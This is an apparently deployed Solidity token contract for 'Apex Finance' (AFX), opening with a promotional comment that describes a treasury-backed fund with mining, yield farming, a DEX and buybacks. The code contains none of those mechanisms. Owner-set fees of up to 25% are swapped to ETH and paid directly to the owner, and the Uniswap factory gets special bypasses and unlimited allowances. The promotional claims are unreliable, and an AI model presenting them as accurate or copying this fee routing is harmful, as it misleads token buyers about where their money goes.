/**
 *Submitted for verification at Etherscan.io on 2022-07-21
*/

/*


░█████╗░██████╗░███████╗██╗░░██╗  ███████╗██╗███╗░░██╗░█████╗░███╗░░██╗░█████╗░███████╗
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝  ██╔════╝██║████╗░██║██╔══██╗████╗░██║██╔══██╗██╔════╝
███████║██████╔╝█████╗░░░╚███╔╝░  █████╗░░██║██╔██╗██║███████║██╔██╗██║██║░░╚═╝█████╗░░
██╔══██║██╔═══╝░██╔══╝░░░██╔██╗░  ██╔══╝░░██║██║╚████║██╔══██║██║╚████║██║░░██╗██╔══╝░░
██║░░██║██║░░░░░███████╗██╔╝╚██╗  ██║░░░░░██║██║░╚███║██║░░██║██║░╚███║╚█████╔╝███████╗
╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝  ╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝



█▀▄▀█ █░█ ▀█▀ █░█ ▄▀█ █░░   █▀▀ █░█ █▄░█ █▀▄   █▀█ █▀▀   █▀▀ █▀█ █▄█ █▀█ ▀█▀ █▀█
█░▀░█ █▄█ ░█░ █▄█ █▀█ █▄▄   █▀░ █▄█ █░▀█ █▄▀   █▄█ █▀░   █▄▄ █▀▄ ░█░ █▀▀ ░█░ █▄█

Treasury is Everything...

In the fiat world there are what everyone knows as mutual funds. 
It's basically run by fund managers investing into several different types of asset classes. 
Most people invest into them as it is an easier way to gain exposure and invest into a basket 
of assets that they may not have the expertise in or time to watch over on a daily basis. 
The financial health of a mutual fund is often determined by their NAV (Net Asset Value) ratios. 
If a mutual fund's NAV ratio is at 1:1. It would mean that their market cap is equal to the value 
of their assets and/or investment instruments. Very often, NAV ratios would hover around 0.80 to 1.25 
based on the future performance of their assets. For Apex Finance context, 
the ratio would be MC:TV (Market Cap to Treasury Valuation) if the ratio is below 1.0, 
you are getting a discount. Above 1.0, you are paying a premium that's worth it because 
we have an ecosystem of investments that would yield us earnings via means of 
crypto mining, yield farming, our own DEX and deflationary measures installed into our protocol. 
(Buy backs burning, Max Supply Cap, Liquidity Bolstering). 
Our treasury health is the heart of our protocol's success.  

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract ApexFinance is Context, IERC20, Ownable {
  using SafeMath for uint256;

  string constant _name = "Apex Finance";
  string constant _symbol = "AFX";
  uint8 constant _decimals = 18;

  uint256 _totalSupply = 1000000000 * (10**_decimals);

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _isExcludeFee;

  IDEXRouter public router;
  address public pair;
  address NATIVETOKEN;

  address public factory;
  address public currentRouter;

  uint256 public totalbuyfee;
  uint256 public totalsellfee;
  uint256 public feeDenominator;
  
  uint256 public swapthreshold;
  bool public inSwap;
  bool public autoswap;

  constructor() {

    currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    NATIVETOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    router = IDEXRouter(currentRouter);

    _isExcludeFee[msg.sender] = true;
    _isExcludeFee[address(this)] = true;
    _isExcludeFee[currentRouter] = true;
    _isExcludeFee[factory] = true;
    
    _allowances[address(this)][address(router)] = type(uint256).max;
    _allowances[address(this)][address(factory)] = type(uint256).max;
    IERC20(NATIVETOKEN).approve(address(router),type(uint256).max);
    IERC20(NATIVETOKEN).approve(address(factory),type(uint256).max);

    _balances[msg.sender] = _totalSupply;
    swapthreshold = _totalSupply.mul(5).div(1000);
    totalbuyfee = 0;
    totalsellfee = 0;
    feeDenominator = 1000;
    emit Transfer(address(0), msg.sender, _totalSupply);

  }

  function setFee(uint256 _totalbuyfee,uint256 _totalsellfee,uint256 _denominator) external onlyOwner returns (bool) {
    require( _totalbuyfee <= _denominator.mul(25).div(100) );
    require( _totalsellfee <= _denominator.mul(25).div(100) );
    totalbuyfee = _totalbuyfee;
    totalsellfee = _totalsellfee;
    feeDenominator = _denominator;
    return true;
  }

  function setPair(address account) external onlyOwner returns (bool) {
    pair = account;
    return true;
  }

  function setFeeExempt(address account,bool flag) external onlyOwner returns (bool) {
    _isExcludeFee[account] = flag;
    return true;
  }

  function setAutoSwap(uint256 amount,bool flag) external onlyOwner returns (bool) {
    swapthreshold = amount;
    autoswap = flag;
    return true;
  }

  function decimals() public pure returns (uint8) { return _decimals; }
  function symbol() public pure returns (string memory) { return _symbol; }
  function name() public pure returns (string memory) { return _name; }
  function totalSupply() external view override returns (uint256) { return _totalSupply; }
  function balanceOf(address account) external view override returns (uint256) { return _balances[account]; }
  function isExcludeFee(address account) external view returns (bool) { return _isExcludeFee[account]; }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transferFrom(msg.sender,recipient,amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function swap2ETH(uint256 amount) internal {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = NATIVETOKEN;
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    amount,
    0,
    path,
    address(this),
    block.timestamp
    );
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(_allowances[sender][msg.sender] != type(uint256).max){
    _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
    }
    _transferFrom(sender,recipient,amount);
    return true;
  }

  function _transferFrom(address sender,address recipient,uint256 amount) internal {
    if(inSwap || msg.sender == factory){
    _basictransfer(sender, recipient, amount);
    } else {
    if(_balances[address(this)]>swapthreshold && autoswap && msg.sender != pair && pair!=address(0)){
    inSwap = true;
    swap2ETH(swapthreshold);
    payable(owner()).transfer(address(this).balance);
    inSwap = false;
    }
    _transfer(sender, recipient, amount);
    }
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    uint256 tempfee;
    if (!_isExcludeFee[sender] && sender==pair) {
    tempfee = amount.mul(totalbuyfee).div(feeDenominator);
    _basictransfer(recipient,address(this),tempfee);
    }else if(!_isExcludeFee[sender] && recipient==pair){
    tempfee = amount.mul(totalsellfee).div(feeDenominator);
    _basictransfer(recipient,address(this),tempfee);
    }

    emit Transfer(sender, recipient, amount.sub(tempfee));
  }

  function _basictransfer(address sender, address recipient, uint256 amount) internal {
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0));
    require(spender != address(0));
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  receive() external payable { }
}